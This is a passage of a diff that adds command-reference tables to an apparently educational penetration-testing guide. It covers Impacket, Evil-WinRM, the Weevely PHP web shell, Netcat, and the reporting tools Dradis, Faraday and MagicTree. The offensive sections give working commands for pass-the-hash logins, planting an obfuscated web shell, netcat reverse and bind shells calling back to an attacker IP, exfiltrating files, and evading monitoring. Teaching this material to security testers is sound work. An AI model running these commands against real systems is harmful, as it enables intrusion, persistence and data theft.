+                        <td>getST.py corp/user:'pass' -spn cifs/server -impersonate administrator</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">lookupsid.py</span></td>
+                        <td>Enumerate users via SID cycling—RID 500-5000 brute force</td>
+                        <td>When LDAP blocked—alternative user enumeration method</td>
+                        <td>lookupsid.py corp/user:'pass'@192.168.1.5</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="info-box">
                 <h4>🎯 Essential Impacket Scripts</h4>
                 <p><strong>Impacket provides 60+ scripts, but key tools for post-exploitation:</strong> <em>secretsdump.py</em> (dump credentials from SAM, LSA, NTDS.dit—the Python Mimikatz), <em>psexec.py/smbexec.py/wmiexec.py</em> (remote command execution via different methods), <em>GetNPUsers.py</em> (AS-REP Roasting—extract hashes from accounts without Kerberos pre-authentication), <em>GetUserSPNs.py</em> (Kerberoasting—request service tickets for offline cracking), <em>ntlmrelayx.py</em> (NTLM relay attacks for credential theft), <em>ticketer.py</em> (forge Kerberos Golden/Silver tickets), <em>getST.py</em> (request service tickets using various methods). All scripts support pass-the-hash, making them ideal for lateral movement after initial credential compromise. The Impacket advantage: pure Python implementation works on any OS, no Windows binaries required.</p>
@@ -15242,6 +16784,79 @@ reg.py contoso.com/administrator:'P@ssw0rd123!'@192.168.1.10 query -keyName HKLM
             <h3>6. Evil-WinRM - Windows Remote Management Shell</h3>
             <p>Evil-WinRM is a WinRM (Windows Remote Management) shell designed for post-exploitation, providing PowerShell remoting capabilities with built-in functions for file upload/download, command execution, and script loading. Since WinRM is increasingly enabled by default on modern Windows systems and often allowed through firewalls, Evil-WinRM offers a legitimate remote access channel that's harder to detect than traditional backdoors.</p>
 
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-i IP</span></td>
+                        <td>Target IP address or hostname for WinRM connection</td>
+                        <td>Every connection—specify target system</td>
+                        <td>evil-winrm -i 192.168.1.10 -u admin -p 'pass'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-u user</span></td>
+                        <td>Username for authentication—domain or local account</td>
+                        <td>With -p or -H—provide authentication credentials</td>
+                        <td>evil-winrm -i 192.168.1.10 -u administrator -p 'P@ssw0rd'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-p password</span></td>
+                        <td>Plaintext password authentication</td>
+                        <td>When you have password—standard authentication</td>
+                        <td>evil-winrm -i 192.168.1.10 -u admin -p 'P@ssw0rd123!'</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-H hash</span></td>
+                        <td>Pass-the-hash authentication—use NTLM hash without password</td>
+                        <td>After credential dumping—lateral movement with hashes only</td>
+                        <td>evil-winrm -i 192.168.1.10 -u admin -H 32ed87bdb5fdc5e9cba88547376818d4</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-s scripts-path</span></td>
+                        <td>Directory of PowerShell scripts to load into memory—no disk write on target</td>
+                        <td>Load tools (PowerView, PowerUp)—invoke functions directly</td>
+                        <td>evil-winrm -i 192.168.1.10 -u admin -p 'pass' -s /opt/tools/</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-e exes-path</span></td>
+                        <td>Directory of executables to upload—binaries accessible in session</td>
+                        <td>Stage tools—upload mimikatz, winPEAS, etc.</td>
+                        <td>evil-winrm -i 192.168.1.10 -u admin -p 'pass' -e /opt/binaries/</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">upload</span></td>
+                        <td>Upload file from attacker to target—built-in file transfer</td>
+                        <td>Deploy payloads/tools—easier than SMB/HTTP transfer</td>
+                        <td>*Evil-WinRM* PS C:\> upload /root/mimikatz.exe C:\Temp\m.exe</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">download</span></td>
+                        <td>Download file from target to attacker—exfiltrate data</td>
+                        <td>Data extraction—retrieve sensitive files</td>
+                        <td>*Evil-WinRM* PS C:\> download C:\passwords.txt /tmp/loot/pass.txt</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">services</span></td>
+                        <td>List/manage Windows services—enumerate running services</td>
+                        <td>Service enumeration—find attack targets or persistence</td>
+                        <td>*Evil-WinRM* PS C:\> services</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">menu</span></td>
+                        <td>Display Evil-WinRM command menu—show available built-in functions</td>
+                        <td>When forgetting syntax—quick reference</td>
+                        <td>*Evil-WinRM* PS C:\> menu</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="info-box">
                 <h4>🎯 Evil-WinRM Features and Advantages</h4>
                 <p><strong>Evil-WinRM extends WinRM with attacker-friendly features:</strong> <em>Built-in functions</em> (upload/download files without additional tools, load PowerShell scripts directly into memory, bypass execution policy restrictions, menu system for common tasks), <em>Protocol advantages</em> (WinRM uses port 5985/5986, often whitelisted when SMB 445 is blocked; uses HTTPS for encryption by default; appears as legitimate admin activity in logs), <em>PowerShell integration</em> (full PowerShell language support, access to .NET framework, can load modules like PowerView or PowerUp directly). The killer feature: Evil-WinRM is just a fancy PowerShell remoting client, so all activity appears as "WinRM Administrative Activity"—legitimate enough that many organizations don't heavily monitor it, unlike SMB or RDP connections.</p>
@@ -15336,6 +16951,67 @@ evil-winrm -i 192.168.1.10 -u administrator -p 'P@ssw0rd123!' -P 5986 -S</div>
 
             <h3>7. Weevely - PHP Web Shell with Stealth Features</h3>
             <p>Weevely is a sophisticated PHP web shell and post-exploitation framework that provides a weaponized terminal over HTTP/HTTPS connections. Unlike simple web shells, Weevely uses obfuscated, polymorphic PHP code to evade detection, supports 30+ modules for post-exploitation tasks, and uses encrypted communication channels. It's essential for maintaining persistence on web servers after exploiting web application vulnerabilities.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">generate password</span></td>
+                        <td>Create obfuscated PHP backdoor with password protection—polymorphic shell</td>
+                        <td>Before exploitation—prepare unique backdoor for upload</td>
+                        <td>weevely generate s3cr3t /var/www/html/media.php</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">terminal.sh</span></td>
+                        <td>Execute shell commands on compromised server—basic command execution</td>
+                        <td>After connecting—standard system enumeration</td>
+                        <td>weevely http://target.com/media.php s3cr3t</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">file.download</span></td>
+                        <td>Download file from server to attacker—encrypted transfer over HTTP</td>
+                        <td>Data exfiltration—extract config files, credentials, databases</td>
+                        <td>weevely> file_download /var/www/html/config.php /tmp/config.php</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">file.upload</span></td>
+                        <td>Upload file from attacker to server—stage tools/exploits</td>
+                        <td>Deploy additional tools—linpeas, privilege escalation binaries</td>
+                        <td>weevely> file_upload /root/linpeas.sh /tmp/linpeas.sh</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">sql.console</span></td>
+                        <td>Interactive SQL console using web app's DB connection—inherit credentials</td>
+                        <td>Database access without creds—leverage application's DB session</td>
+                        <td>weevely> sql_console</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">net.scan</span></td>
+                        <td>Port scan from compromised server—use as pivot point</td>
+                        <td>Internal network recon—map DMZ to internal network</td>
+                        <td>weevely> net_scan 192.168.1.0/24 1-1000</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">audit.etcpasswd</span></td>
+                        <td>Parse /etc/passwd for users with login shells—identify targets</td>
+                        <td>Linux privilege escalation—find users for lateral movement</td>
+                        <td>weevely> audit_etcpasswd</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">backdoor.reversetcp</span></td>
+                        <td>Spawn reverse TCP shell—upgrade from HTTP to raw socket</td>
+                        <td>Better interactivity—escape web shell limitations</td>
+                        <td>weevely> backdoor_reversetcp 10.10.14.5 4444</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="info-box">
                 <h4>🎯 Weevely Architecture and Modules</h4>
@@ -15438,6 +17114,79 @@ weevely> :set verbosity 2
 
             <h3>8. Netcat - The TCP/IP Swiss Army Knife</h3>
             <p>Netcat (nc) is the fundamental network utility for reading/writing data across TCP/UDP connections, often called the "TCP/IP Swiss Army Knife." While simple in design, it's essential for post-exploitation: establishing reverse shells, bind shells, port scanning, banner grabbing, file transfers, and creating backdoors. Every penetration tester must master netcat as it's pre-installed on most systems and provides reliable remote access when other tools fail.</p>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Command/Flag</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><span class="inline-code">-l listen</span></td>
+                        <td>Listen mode—create server socket waiting for connections</td>
+                        <td>Set up reverse shell listener or bind shell on target</td>
+                        <td>nc -lvnp 4444</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-v verbose</span></td>
+                        <td>Verbose output—show connection details and status messages</td>
+                        <td>Debugging—understand connection state and errors</td>
+                        <td>nc -lvnp 4444</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-n no-dns</span></td>
+                        <td>Skip DNS resolution—faster connections, avoid DNS logs</td>
+                        <td>Speed and stealth—use IP addresses directly</td>
+                        <td>nc -lvnp 4444</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-p port</span></td>
+                        <td>Specify port number for listening or source port</td>
+                        <td>Define listener port or source—typically 4444, 443, 8080</td>
+                        <td>nc -lvnp 4444</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">-e execute</span></td>
+                        <td>Execute program on connection—spawn shell when client connects</td>
+                        <td>Bind shell—execute /bin/bash or cmd.exe automatically</td>
+                        <td>nc -lvnp 4444 -e /bin/bash</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">nc -lvnp (reverse shell listener)</span></td>
+                        <td>Standard reverse shell listener—wait for target to call back</td>
+                        <td>Most common post-exploitation—catch shell from exploited target</td>
+                        <td>nc -lvnp 4444 (attacker) + nc 10.10.14.5 4444 -e /bin/bash (target)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">nc target port (connect)</span></td>
+                        <td>Connect to remote host and port—client mode</td>
+                        <td>Banner grabbing, connecting to bind shells, testing connectivity</td>
+                        <td>nc 192.168.1.10 22</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">nc -lvnp port -e /bin/sh (bind shell)</span></td>
+                        <td>Bind shell—target listens, attacker connects to get shell</td>
+                        <td>When reverse connection blocked—target opens port instead</td>
+                        <td>nc -lvnp 4444 -e /bin/bash (target) + nc 192.168.1.10 4444 (attacker)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">file transfer (< and >)</span></td>
+                        <td>Transfer files over TCP—no FTP/HTTP needed</td>
+                        <td>Exfiltrate data or upload tools when other methods unavailable</td>
+                        <td>nc -lvnp 4444 > file.zip (receiver) + nc 10.10.14.5 4444 < file.zip (sender)</td>
+                    </tr>
+                    <tr>
+                        <td><span class="inline-code">port scanning (-z)</span></td>
+                        <td>Zero I/O mode port scan—test port connectivity without sending data</td>
+                        <td>When nmap unavailable—basic port discovery</td>
+                        <td>nc -zv 192.168.1.10 1-1000</td>
+                    </tr>
+                </tbody>
+            </table>
 
             <div class="code"># Reverse shell (most common post-exploitation technique)
 # On attacker machine - set up listener
@@ -15602,6 +17351,91 @@ $ curl http://localhost:3000/api/export?template=PCI_DSS \
   -H "Authorization: Token abc123..." -o report.pdf
 # Full workflow automation for continuous testing</div>
 
+            <table>
+                <thead>
+                    <tr>
+                        <th>Feature/Command</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Project Management</strong></td>
+                        <td>Create isolated workspaces for different engagements with separate node trees, findings, and team access. Prevents cross-client data leakage and enables parallel testing.</td>
+                        <td>At engagement start to establish dedicated environment. Create projects with naming convention: ClientName_Type_Date (Acme_External_2026-Q1).</td>
+                        <td>New Project → "Acme Corp External Pentest 2026" → Set team members with read/write permissions</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Node Creation</strong></td>
+                        <td>Build hierarchical tree structure mirroring network topology. Nodes represent hosts, subnets, or logical groupings. All findings attached as child notes.</td>
+                        <td>After reconnaissance to organize discovered hosts. Structure: Root → 192.168.1.0/24 (DMZ) → 192.168.1.10 (Web Server) → Vulnerabilities.</td>
+                        <td>Create Node → "192.168.1.10" → Label "Web Server - Apache 2.4" → Attach port scan results</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Nmap</strong></td>
+                        <td>Auto-parse Nmap XML to extract hosts, open ports, services, OS detection. Creates node per host with service enumeration as child notes. Eliminates manual data entry.</td>
+                        <td>After network scanning phase. Use Nmap's -oX flag to generate XML: nmap -sV -oX scan.xml target. Import establishes initial attack surface map.</td>
+                        <td>Upload → nmap_scan.xml → Dradis creates nodes for 192.168.1.10, .20, .30 with ports/services attached</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Nessus</strong></td>
+                        <td>Parse Nessus .nessus files to extract vulnerabilities with CVSS scores, CVE references, affected hosts. Groups findings by severity (Critical/High/Medium/Low).</td>
+                        <td>After vulnerability scanning to identify exploitable weaknesses. Provides compliance-ready vulnerability data with risk ratings for PCI DSS/NIST reporting.</td>
+                        <td>Upload → nessus_scan.nessus → Auto-creates "Apache 2.2.8 Multiple Vulnerabilities" (CVSS 9.8) on host nodes</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Burp</strong></td>
+                        <td>Extract web application vulnerabilities from Burp Suite XML export. Includes SQLi, XSS, CSRF findings with HTTP request/response evidence.</td>
+                        <td>After web app penetration testing. Import captures manual testing discoveries that automated scanners miss (business logic flaws, authentication bypasses).</td>
+                        <td>Burp → Target → Save selected issues → burp_findings.xml → Import creates "SQL Injection in /login.php" with PoC payload</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Nikto</strong></td>
+                        <td>Parse Nikto web server scan output (XML format). Identifies outdated software, misconfigurations, dangerous HTTP methods, directory listings.</td>
+                        <td>After web server enumeration to document configuration weaknesses. Links to OSVDB references for vulnerability details and remediation guidance.</td>
+                        <td>nikto -h target.com -o nikto.xml -Format xml → Import → "Outdated Apache 2.2.8" + "OPTIONS method enabled"</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import OpenVAS</strong></td>
+                        <td>Parse OpenVAS vulnerability scan results (XML export). Similar to Nessus but for open-source scanning. Extracts vulnerabilities with NVT (Network Vulnerability Tests) references.</td>
+                        <td>When using OpenVAS instead of Nessus (budget constraints, compliance requirements). Provides equivalent vulnerability data with CVE/CVSS scoring.</td>
+                        <td>OpenVAS → Export report as XML → Import → "SSL/TLS: Deprecated SSLv3 Detected" (CVE-2014-3566, CVSS 6.8)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Note Attachments</strong></td>
+                        <td>Upload screenshots, packet captures, exploit code, configuration files as evidence. Stores binary files within project for complete documentation.</td>
+                        <td>During manual testing to attach proof-of-concept evidence. Screenshot SQL injection, attach exploit script, include packet capture of credential theft.</td>
+                        <td>Create Note → "SQL Injection in /search.php" → Attach screenshot showing "UNION SELECT" extracting passwords table</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Export to Word/Excel/HTML</strong></td>
+                        <td>Generate professional reports using customizable templates. Word for executive summaries, Excel for vulnerability spreadsheets, HTML for web-based dashboards.</td>
+                        <td>At engagement completion for client deliverables. Customize templates with client branding, risk matrices, remediation roadmaps before export.</td>
+                        <td>Export → Template "PCI_DSS_Report" → Format PDF → Output includes findings by severity, CVSS scores, remediation steps</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Report Templates</strong></td>
+                        <td>Pre-built report formats for common frameworks (PCI DSS, HIPAA, OWASP, PTES). Customizable with client logos, color schemes, executive summary sections.</td>
+                        <td>Before engagement starts to align reporting with client expectations. Modify templates to match client's existing security documentation standards.</td>
+                        <td>Settings → Templates → Duplicate "PCI_DSS" template → Add client logo → Customize risk matrix (align with client's risk appetite)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>API Endpoints</strong></td>
+                        <td>RESTful API for automation: create projects, upload scan results, export reports programmatically. Enables integration with CI/CD pipelines for continuous security testing.</td>
+                        <td>For automated workflows—nightly vulnerability scans auto-import to Dradis, weekly report generation. Integrate with Jenkins/GitLab CI for DevSecOps pipelines.</td>
+                        <td>curl -X POST http://dradis:3000/api/upload -H "Authorization: Token abc123" -F "file=@scan.xml" -F "plugin=nmap"</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Team Collaboration</strong></td>
+                        <td>Multi-user access with real-time updates. Team members see each other's notes instantly, can comment on findings, assign tasks, merge duplicate discoveries.</td>
+                        <td>For distributed teams or large engagements. Assign team members to specific IP ranges (Alice tests DMZ, Bob tests internal), use comments for peer review.</td>
+                        <td>Team member adds "Port 445 open on 192.168.1.50" → You see update instantly → Comment "I'll test for MS17-010 EternalBlue"</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="info-box">
                 <h4>🎯 Dradis Workflow Best Practices</h4>
                 <p><strong>Effective Dradis usage requires structured methodology:</strong> <em>Project organization:</em> Create separate projects for each engagement with clear naming conventions (Client_Type_Date). Use the node tree to mirror network architecture—organize by subnet, DMZ vs internal, or business unit. Tag findings with custom labels (externally exploitable, compliance-relevant, quick win). <em>Import strategy:</em> Run automated scans first (Nmap, Nessus, Nikto) and import immediately to establish baseline. Manually document application-specific findings that tools miss (business logic flaws, privilege escalation paths). Use Dradis's duplicate detection to merge similar findings across hosts. <em>Collaboration workflow:</em> Assign team members to specific nodes/targets. Use comments to discuss finding severity or request peer review. Lock nodes during report generation to prevent conflicts. <em>Report generation:</em> Customize templates with client branding before engagement starts. Include risk ratings that align with client's existing frameworks (NIST, ISO 27001). Provide remediation steps with specific commands/configurations, not generic advice. <em>Data retention:</em> Export projects as XML archives for client deliverables and future reference. Sanitize sensitive data before sharing projects with third parties.</p>
@@ -15656,6 +17490,109 @@ $ curl http://localhost:5985/api/v2/ws/Target_Corp_Q1_2026/vulns \
 # Returns JSON array of all vulnerabilities
 # Used for custom dashboards, SIEM integration</div>
 
+            <table>
+                <thead>
+                    <tr>
+                        <th>Feature/Command</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>faraday-server</strong></td>
+                        <td>Launch Faraday's PostgreSQL-backed server providing web interface (port 5985) and API endpoints. Centralizes all penetration testing data with multi-user support.</td>
+                        <td>At engagement start to establish persistent data repository. Start server before running any scans—Faraday captures command output transparently.</td>
+                        <td>sudo systemctl start faraday-server → Navigate to http://localhost:5985 → Login with credentials → Ready to capture scan data</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Workspace Creation</strong></td>
+                        <td>Create isolated environments for different clients/engagements. Each workspace has separate hosts, services, vulnerabilities, credentials databases.</td>
+                        <td>For every new engagement to maintain data separation. Naming convention: ClientName_Type_Date (Acme_External_Q1-2026). Prevents cross-client contamination.</td>
+                        <td>Web UI → Workspaces → Create New → "Target_Corp_Q1_2026" → Set as active workspace for current terminal session</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Nmap</strong></td>
+                        <td>Auto-capture Nmap output when run in Faraday terminal. Extracts hosts, ports, services, OS detection without manual XML import. Transparent integration.</td>
+                        <td>During network reconnaissance phase. Run Nmap normally—Faraday plugin intercepts stdout, parses results, creates host/service objects automatically.</td>
+                        <td>nmap -sV 192.168.1.0/24 → Faraday creates hosts for .10, .20, .30 → Adds services: 22/SSH, 80/HTTP, 3306/MySQL</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Nessus</strong></td>
+                        <td>Parse Nessus .nessus files or auto-capture Nessus CLI output. Extracts vulnerabilities with CVSS scores, plugin families, exploitability ratings.</td>
+                        <td>After vulnerability scanning to import comprehensive vulnerability data. Use Nessus CLI (nessuscli) or upload .nessus file via web interface.</td>
+                        <td>Upload .nessus file → Web UI → "Import" → Faraday creates "MS17-010 EternalBlue" (CVSS 9.3) on affected Windows hosts</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Burp</strong></td>
+                        <td>Import Burp Suite XML exports to capture web application vulnerabilities. Includes SQLi, XSS, CSRF with HTTP request/response evidence.</td>
+                        <td>After manual web testing in Burp. Export issues as XML (Burp → Target → Save selected issues) and import to consolidate with other findings.</td>
+                        <td>Burp → Export issues.xml → Faraday import → "Reflected XSS in /search" (High severity) linked to host web app</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Metasploit</strong></td>
+                        <td>Bi-directional Metasploit integration. Import Metasploit database or auto-document successful exploits when running msfconsole within Faraday.</td>
+                        <td>During exploitation phase. When you compromise host via Metasploit, Faraday auto-creates vulnerability record with exploit details, session info.</td>
+                        <td>msfconsole → exploit/windows/smb/ms17_010_eternalblue → sessions 1 → Faraday logs "Successful exploit on 192.168.1.10"</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Host Management</strong></td>
+                        <td>Centralized inventory of all discovered hosts with OS detection, hostnames, MAC addresses. Filter/search by attributes (OS, open ports, vulnerability count).</td>
+                        <td>Throughout engagement to track attack surface. Query "Show all Windows hosts" or "Hosts with port 445 open" to identify exploitation targets.</td>
+                        <td>Web UI → Hosts tab → Filter: OS="Windows", Port="445" → Results: 12 hosts vulnerable to SMB attacks (EternalBlue candidates)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Service Tracking</strong></td>
+                        <td>Database of all discovered network services with version detection. Links services to hosts and associates vulnerabilities with specific service versions.</td>
+                        <td>For service-specific targeting. Query "All Apache 2.2.x instances" to identify outdated web servers, or "All SSH services" for brute force targets.</td>
+                        <td>Web UI → Services tab → Search: "Apache 2.2" → 5 hosts running vulnerable version → Link to CVE-2011-3192 (Range header DoS)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Credential Storage</strong></td>
+                        <td>Secure database of discovered credentials (usernames, passwords, hashes, SSH keys). Links credentials to source host and service for reuse analysis.</td>
+                        <td>During password attacks or post-exploitation. Store cracked hashes, discovered plaintext credentials, SSH keys for lateral movement mapping.</td>
+                        <td>Found creds: admin:P@ssw0rd on 192.168.1.10 → Store in Faraday → Test credential reuse on other hosts (.20, .30, .40)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Vulnerability Aggregation</strong></td>
+                        <td>Deduplicates findings from multiple tools. If Nmap, Nessus, and manual testing all identify same vulnerability, Faraday merges into single entry.</td>
+                        <td>For accurate vulnerability counts. Prevents reporting same issue 3 times. Aggregation includes evidence from all sources in merged record.</td>
+                        <td>Nmap flags outdated OpenSSH → Nessus reports CVE-2016-10009 → You verify manually → Faraday shows 1 vulnerability with 3 evidence sources</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Plugin Ecosystem</strong></td>
+                        <td>60+ plugins auto-parse output from security tools (Nmap, Nikto, sqlmap, Hydra, Wfuzz, OpenVAS). Extensible—write custom plugins for proprietary tools.</td>
+                        <td>Throughout engagement for automated capture. Plugins eliminate manual data entry—run tool, Faraday captures results automatically.</td>
+                        <td>sqlmap -u http://target/page?id=1 → Faraday plugin extracts "SQL Injection" vulnerability → Links to affected URL parameter</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Report Generation</strong></td>
+                        <td>Export reports as PDF/Excel/CSV with customizable templates. Includes executive summary, findings by severity, host-vulnerability matrix, remediation guidance.</td>
+                        <td>At engagement conclusion for client deliverables. Generate compliance reports (PCI DSS, HIPAA) or technical reports for IT teams.</td>
+                        <td>Web UI → Reports → Template "Executive Summary" → Format PDF → Include risk matrix, top 10 critical findings, remediation roadmap</td>
+                    </tr>
+                    <tr>
+                        <td><strong>GTK/Web Client</strong></td>
+                        <td>Two interface options: GTK desktop client (Linux/Mac native app) and web interface (browser-based). Both access same PostgreSQL backend for data consistency.</td>
+                        <td>GTK for penetration testers running Faraday locally. Web interface for distributed teams, management dashboards, or remote access scenarios.</td>
+                        <td>Tester uses GTK client → Runs scans → Manager accesses web interface from office → Reviews real-time vulnerability dashboard</td>
+                    </tr>
+                    <tr>
+                        <td><strong>API Integration</strong></td>
+                        <td>RESTful API for automation and custom integrations. Create workspaces, add vulnerabilities, query data programmatically. Enables CI/CD security integration.</td>
+                        <td>For automated workflows: CI pipeline runs security scans → API imports results to Faraday → Nightly vulnerability reports auto-generated.</td>
+                        <td>curl http://localhost:5985/api/v2/ws/Target/vulns -H "Authorization: Token abc123" → Returns JSON of all vulnerabilities</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Multi-User Support</strong></td>
+                        <td>User authentication with role-based access control. Team members collaborate in shared workspace with real-time updates. Audit logs track who added what.</td>
+                        <td>For team engagements. Assign roles: Admin (full access), Pentester (create/edit findings), Client (read-only report access). Track contributions via audit trail.</td>
+                        <td>Alice adds Nmap results → Bob sees updates instantly → Charlie (client role) accesses web dashboard to monitor progress without edit rights</td>
+                    </tr>
+                </tbody>
+            </table>
+
             <div class="warning-box">
                 <h4>⚠️ Faraday Security Considerations</h4>
                 <p><strong>Faraday stores sensitive penetration test data—secure it properly:</strong> Run Faraday server on isolated testing networks, not production environments. Use strong database passwords (PostgreSQL backend) and change default credentials immediately. Enable HTTPS for web interface to encrypt data in transit—client credentials and vulnerability details should never traverse the network unencrypted. Restrict network access to Faraday server (firewall rules, VPN-only access). Regularly backup Faraday database—it contains your complete engagement history, discovered vulnerabilities, and captured credentials. Consider data retention policies: purge old workspaces to minimize exposure of historical client data. For multi-client consulting firms, isolate Faraday instances per client (separate VMs/containers) to prevent cross-client data leakage. When engagement ends, export final reports and securely wipe workspace data per data protection agreements.</p>
@@ -15693,6 +17630,79 @@ $ magictree
 # Report → Generate → Select template "VulnSummary.xsl"
 # Output: vuln_report.html
 # Includes table of findings sorted by severity</div>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Feature</th>
+                        <th>Purpose & Why</th>
+                        <th>When to Use</th>
+                        <th>Example</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><strong>Tree Structure</strong></td>
+                        <td>Hierarchical data organization where root is target organization, branches are IP ranges/subnets, leaves are hosts, and vulnerabilities hang as children. Mirrors network topology.</td>
+                        <td>For intuitive organization of complex penetration tests. Structure: Root ("Acme Corp") → Subnet (192.168.1.0/24) → Host (.10) → Service (port 80) → Vulnerability.</td>
+                        <td>Root: "Acme External Test" → Branch: "DMZ 10.0.1.0/24" → Host: "10.0.1.5 (Web Server)" → Vuln: "Apache 2.2.8 CVE-2011-3192"</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Nmap</strong></td>
+                        <td>Parse Nmap XML output to auto-populate tree with hosts, open ports, service versions, OS detection. Creates node per host with services as children.</td>
+                        <td>After network reconnaissance. Use nmap -oX scan.xml for XML output. Import establishes baseline attack surface map in tree structure.</td>
+                        <td>Data → Import → Nmap XML → scan.xml → MagicTree creates nodes: 192.168.1.10 (22/SSH, 80/HTTP), .20 (445/SMB), .30 (3306/MySQL)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Import Nessus</strong></td>
+                        <td>Parse Nessus .nessus files to extract vulnerabilities with severity, CVE references, plugin information. Attaches vulnerabilities to affected host nodes.</td>
+                        <td>After vulnerability scanning to identify weaknesses. Nessus data enriches host nodes with exploitable vulnerabilities, compliance violations.</td>
+                        <td>Data → Import → Nessus → scan.nessus → Host 192.168.1.10 gains child nodes: "MS17-010" (Critical), "Weak SSL Ciphers" (Medium)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>XPath Queries</strong></td>
+                        <td>Powerful query language for searching tree data. Find hosts matching complex criteria (OS + port + vulnerability). XPath enables analysis impossible in simple filters.</td>
+                        <td>For targeted analysis: "Show all Windows hosts with port 445 open" or "List hosts with High severity vulnerabilities". Enables sophisticated data mining.</td>
+                        <td>Query: //host[port/@number='445'][@os='Windows'] → Results: 5 Windows hosts with SMB exposed → Candidates for EternalBlue testing</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Report Templates</strong></td>
+                        <td>XSLT-based templates transform tree data into HTML/PDF reports. Customizable templates with filtering (show only Critical), grouping (by vuln type), styling.</td>
+                        <td>At engagement completion for professional deliverables. Modify templates to match client branding, include/exclude findings, adjust severity thresholds.</td>
+                        <td>Report → Generate → Template "VulnSummary.xsl" → Output: HTML report with findings table sorted by CVSS score (Critical to Low)</td>
+                    </tr>
+                    <tr>
+                        <td><strong>XSLT Transformation</strong></td>
+                        <td>Extensible Stylesheet Language Transformations convert XML tree data into various formats. Write custom XSLT to generate CSV, JSON, or specialized report formats.</td>
+                        <td>For custom reporting requirements. Client needs Excel-compatible CSV? Write XSLT to output comma-delimited vulnerability list with specific columns.</td>
+                        <td>Custom XSLT: Extract all hosts with ports → Output CSV: "IP,Port,Service,Version" → Import to Excel for client's asset management database</td>
+                    </tr>
+                    <tr>
+                        <td><strong>BeanShell Scripting</strong></td>
+                        <td>Java-based scripting language for automation. Write scripts to analyze tree data, generate custom queries, auto-create notes, integrate with external tools.</td>
+                        <td>For repetitive tasks or complex analysis. Script to check all hosts for common misconfigurations, auto-generate finding summaries, calculate statistics.</td>
+                        <td>BeanShell script: Iterate all hosts → Check if port 22 open && OS="Linux" → Auto-create note "SSH Brute Force Target" for each match</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Node Hierarchy</strong></td>
+                        <td>Parent-child relationships organize data logically. Subnets contain hosts, hosts contain services, services contain vulnerabilities. Collapsible tree for navigation.</td>
